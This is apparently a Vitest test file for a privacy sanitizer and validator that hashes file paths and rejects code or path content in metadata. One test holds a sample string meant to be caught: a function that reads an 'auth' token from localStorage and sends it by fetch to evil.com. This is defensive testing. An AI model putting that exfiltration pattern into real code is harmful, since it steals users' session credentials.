import type { FileMetadata } from "@snapback-oss/contracts";
import { beforeEach, describe, expect, it } from "vitest";
import { PrivacySanitizer } from "../../src/privacy/sanitizer.js";
import { PrivacyValidator } from "../../src/privacy/validator.js";

describe("Privacy Integration", () => {
	let sanitizer: PrivacySanitizer;
	let validator: PrivacyValidator;

	beforeEach(() => {
		sanitizer = new PrivacySanitizer({
			hashFilePaths: true,
			anonymizeWorkspace: true,
		});
		validator = new PrivacyValidator();
	});

	// ============================================================================
	// FULL PIPELINE TESTS
	// ============================================================================

	describe("Full Pipeline", () => {
		it("should complete end-to-end privacy pipeline", async () => {
			// GIVEN: Raw FileMetadata with various data types
			const rawMetadata: FileMetadata = {
				path: "/Users/john/project/src/auth.ts",
				hash: "abc123def456",
				size: 1024,
				modified: Date.now(),
				risk: {
					score: 0.75,
					severity: "high",
					factors: [
						{ type: "secret-detection", weight: 0.5, description: "API key pattern" },
						{ type: "high-entropy", weight: 0.3, description: "Entropy score 4.8" },
					],
				},
			};

			// WHEN: Apply privacy pipeline (sanitize → validate)
			const sanitizedData = sanitizer.sanitize(rawMetadata);

			// THEN: Sanitized data should pass validation
			expect(sanitizer.isPrivacySafe(sanitizedData)).toBe(true);
			expect(sanitizedData.pathHash).toBeDefined();
			expect(sanitizedData.path).toBe(sanitizedData.pathHash); // Path replaced with hash
		});

		it("should perform cross-component privacy checks", async () => {
			// GIVEN: Metadata that passes sanitizer
			const metadata: FileMetadata = {
				path: "/workspace/file.ts",
				hash: "file-hash-123",
				size: 512,
				modified: Date.now(),
			};

			// WHEN: Sanitize and then validate
			const sanitized = sanitizer.sanitize(metadata);
			const isSafe = sanitizer.isPrivacySafe(sanitized);

			// THEN: Both checks should pass
			expect(isSafe).toBe(true);
			expect(sanitized.path).not.toBe("/workspace/file.ts"); // Original path replaced
		});

		it("should enforce zero-trust architecture", async () => {
			// GIVEN: Metadata with forbidden properties
			const maliciousMetadata = {
				path: "/Users/user/code.ts",
				pathHash: "hash123",
				hash: "abc",
				size: 100,
				modified: Date.now(),
				content: "function malicious() { /* code */ }", // FORBIDDEN
			} as any;

			// THEN: Should reject data with forbidden properties
			expect(sanitizer.isPrivacySafe(maliciousMetadata)).toBe(false);
		});

		it("should reject large strings as potential code content", async () => {
			// GIVEN: Metadata with suspiciously large string
			const largeStringData = {
				path: "hash",
				pathHash: "hash",
				hash: "abc",
				size: 100,
				modified: Date.now(),
				description: "x".repeat(1001), // Over 1000 chars
			};

			// THEN: Should flag large strings
			expect(sanitizer.isPrivacySafe(largeStringData)).toBe(false);
		});
	});

	// ============================================================================
	// SANITIZER TESTS
	// ============================================================================

	describe("PrivacySanitizer", () => {
		it("should hash file paths when enabled", () => {
			const metadata: FileMetadata = {
				path: "/Users/sensitive/project/secret.ts",
				hash: "abc123",
				size: 256,
				modified: Date.now(),
			};

			const sanitized = sanitizer.sanitize(metadata);

			expect(sanitized.pathHash).toBeDefined();
			expect(sanitized.pathHash?.length).toBe(64); // SHA-256 hex = 64 chars
			expect(sanitized.path).toBe(sanitized.pathHash);
		});

		it("should preserve non-sensitive metadata", () => {
			const metadata: FileMetadata = {
				path: "/project/file.ts",
				hash: "original-hash",
				size: 1024,
				modified: 1234567890,
			};

			const sanitized = sanitizer.sanitize(metadata);

			expect(sanitized.hash).toBe("original-hash");
			expect(sanitized.size).toBe(1024);
			expect(sanitized.modified).toBe(1234567890);
		});

		it("should sanitize risk factor strings", () => {
			const factor = 'Found API key in "/Users/john/project/config.json"';
			const sanitized = sanitizer.sanitizeFactor(factor);

			expect(sanitized).not.toContain("/Users/john");
			expect(sanitized).toContain("<path>");
		});

		it("should not mutate original metadata", () => {
			const original: FileMetadata = {
				path: "/original/path.ts",
				hash: "hash123",
				size: 100,
				modified: Date.now(),
			};

			const originalPath = original.path;
			sanitizer.sanitize(original);

			expect(original.path).toBe(originalPath); // Original unchanged
		});

		it("should throw on excessively large input strings", () => {
			const hugeString = "x".repeat(10001);

			expect(() => sanitizer.sanitizeFactor(hugeString)).toThrow("Input too large");
		});
	});

	// ============================================================================
	// VALIDATOR TESTS
	// ============================================================================

	describe("PrivacyValidator", () => {
		it("should allow clean metadata", () => {
			const cleanData = {
				hash: "abc123",
				size: 1024,
				modified: Date.now(),
				pathHash: "hashed-path",
			};

			expect(validator.isMetadataOnly(cleanData)).toBe(true);
		});

		it("should reject forbidden properties", () => {
			const forbiddenProps = [
				{ content: "function test() {}" },
				{ sourceCode: "const x = 1" },
				{ fileContent: "import React" },
				{ code: "export default" },
				{ text: "Some code here" },
				{ body: "Request body" },
				{ filePath: "/path/to/file" },
				{ fullPath: "/full/path" },
				{ absolutePath: "/absolute/path" },
			];

			for (const prop of forbiddenProps) {
				const data = { hash: "abc", size: 100, modified: Date.now(), ...prop };
				expect(validator.isMetadataOnly(data)).toBe(false);
			}
		});

		it("should detect code-like strings", () => {
			const codePatterns = [
				"function handleClick() { alert('clicked'); }",
				"const API_KEY = 'secret123'",
				"let result = await fetch(url)",
				"class UserService extends BaseService",
				"import { useState } from 'react'",
				"export default function App()",
				"if (condition) { doSomething() }",
				"for (let i = 0; i < 10; i++)",
				"while (running) { process() }",
			];

			for (const pattern of codePatterns) {
				const data = { hash: "abc", size: 100, modified: Date.now(), description: pattern };
				expect(validator.isMetadataOnly(data)).toBe(false);
			}
		});

		it("should allow non-code strings", () => {
			const safeStrings = [
				"File was modified 5 minutes ago",
				"SHA-256 hash verification passed",
				"Risk score: 0.45 (medium)",
				"3 snapshots available",
			];

			for (const str of safeStrings) {
				const data = { hash: "abc", size: 100, modified: Date.now(), description: str };
				expect(validator.isMetadataOnly(data)).toBe(true);
			}
		});

		it("should check nested objects", () => {
			const nestedForbidden = {
				hash: "abc",
				size: 100,
				modified: Date.now(),
				nested: {
					deep: {
						content: "hidden code content", // Forbidden nested
					},
				},
			};

			expect(validator.isMetadataOnly(nestedForbidden)).toBe(false);
		});
	});

	// ============================================================================
	// COMPLIANCE TESTS
	// ============================================================================

	describe("Compliance", () => {
		it("should verify GDPR compliance - no PII transmitted", async () => {
			// GIVEN: Metadata with potential PII paths
			const piiMetadata: FileMetadata = {
				path: "/Users/john.smith@company.com/Documents/private/taxes.xlsx",
				hash: "hash123",
				size: 50000,
				modified: Date.now(),
			};

			// WHEN: Sanitizing
			const sanitized = sanitizer.sanitize(piiMetadata);

			// THEN: PII should be removed
			expect(sanitized.path).not.toContain("john.smith");
			expect(sanitized.path).not.toContain("@company.com");
			expect(sanitized.pathHash?.length).toBe(64); // Properly hashed
		});

		it("should verify data minimization principle", async () => {
			// GIVEN: FileMetadata with only required fields
			const minimalMetadata: FileMetadata = {
				path: "/project/file.ts",
				hash: "abc123",
				size: 1024,
				modified: Date.now(),
			};

			// WHEN: Sanitizing
			const sanitized = sanitizer.sanitize(minimalMetadata);

			// THEN: Only necessary fields should remain
			const keys = Object.keys(sanitized);
			expect(keys).toContain("hash");
			expect(keys).toContain("size");
			expect(keys).toContain("modified");
			expect(keys).toContain("pathHash");
			// No content, no sourceCode, no raw paths
		});

		it("should prevent sensitive data leakage in risk factors", async () => {
			// GIVEN: Risk factors with sensitive file references
			const metadata: FileMetadata = {
				path: "/project/auth.ts",
				hash: "abc123",
				size: 512,
				modified: Date.now(),
				risk: {
					score: 0.8,
					severity: "high",
					factors: [
						{
							type: 'API key found in "/Users/admin/secrets.env"',
							weight: 0.9,
							description: 'Detected pattern in line 42: API_KEY="sk-secret123"',
						},
					],
				},
			};

			// WHEN: Sanitizing
			const sanitized = sanitizer.sanitize(metadata);

			// THEN: Sensitive data in factors should be redacted
			const factor = sanitized.risk?.factors?.[0];
			expect(factor?.type).not.toContain("/Users/admin");
			expect(factor?.type).toContain("<path>");
		});

		it("should block code content disguised in metadata", async () => {
			// GIVEN: Attempt to smuggle code in description field
			const disguised = {
				hash: "abc",
				size: 100,
				modified: Date.now(),
				description: `
					function stealData() {
						const secrets = localStorage.getItem('auth');
						fetch('https://evil.com/steal', { body: secrets });
					}
				`,
			};

			// THEN: Validator should catch code patterns
			expect(validator.isMetadataOnly(disguised)).toBe(false);
		});
	});

	// ============================================================================
	// EDGE CASES
	// ============================================================================

	describe("Edge Cases", () => {
		it("should handle empty metadata gracefully", () => {
			const emptyMetadata = {
				path: "",
				hash: "",
				size: 0,
				modified: 0,
			} as FileMetadata;

			const sanitized = sanitizer.sanitize(emptyMetadata);
			expect(sanitized).toBeDefined();
			expect(sanitized.pathHash).toBeDefined();
		});

		it("should handle null/undefined nested properties", () => {
			const sparseMetadata: FileMetadata = {
				path: "/file.ts",
				hash: "abc",
				size: 100,
				modified: Date.now(),
				risk: undefined,
			};

			const sanitized = sanitizer.sanitize(sparseMetadata);
			expect(sanitized).toBeDefined();
			expect(sanitized.risk).toBeUndefined();
		});

		it("should handle special characters in paths", () => {
			const specialPath: FileMetadata = {
				path: "/Users/名前/项目/файл.ts", // Unicode characters
				hash: "abc",
				size: 100,
				modified: Date.now(),
			};

			const sanitized = sanitizer.sanitize(specialPath);
			expect(sanitized.pathHash?.length).toBe(64); // Still produces valid hash
		});

		it("should sanitize path without hashFilePaths config", () => {
			const noHashSanitizer = new PrivacySanitizer({
				hashFilePaths: false,
				anonymizeWorkspace: false,
			});

			const metadata: FileMetadata = {
				path: "/original/path.ts",
				hash: "abc",
				size: 100,
				modified: Date.now(),
			};

			const sanitized = noHashSanitizer.sanitize(metadata);
			// Path should remain unchanged when hashing is disabled
			expect(sanitized.path).toBe("/original/path.ts");
			expect(sanitized.pathHash).toBeUndefined();
		});

		it("should handle deeply nested risk factors", () => {
			const deepMetadata: FileMetadata = {
				path: "/file.ts",
				hash: "abc",
				size: 100,
				modified: Date.now(),
				risk: {
					score: 0.5,
					severity: "medium",
					factors: Array.from({ length: 10 }, (_, i) => ({
						type: `factor-${i}`,
						weight: 0.1,
						description: `Description for factor ${i}`,
					})),
				},
			};

			const sanitized = sanitizer.sanitize(deepMetadata);
			expect(sanitized.risk?.factors?.length).toBe(10);
		});
	});
});
